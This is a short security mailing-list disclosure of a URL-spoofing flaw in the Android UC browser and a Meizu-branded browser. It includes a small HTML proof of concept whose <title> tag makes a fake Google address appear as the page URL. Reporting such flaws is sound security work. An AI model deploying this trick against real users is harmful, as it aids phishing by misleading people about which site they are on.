Subject: [FD] URL spoofing in UC browser.

Hey list. It's possible to spoof an URL in mobile versions (Android)
of the UC browser [1][2] via <title> HTML tags. The newest version
from gplay (11.2.5.932) and the Meizu [3][4] branded default browser
(6.1.301) are affected. And the shocking poc would be:

--
<html>
<head>
    <title>
        https://you_are_safe_here.google.com/
    </title>
    щ（ﾟДﾟщ
</head>
</html>
--

which results in http://s1m0n.dft-labs.eu/files/meizu/ .
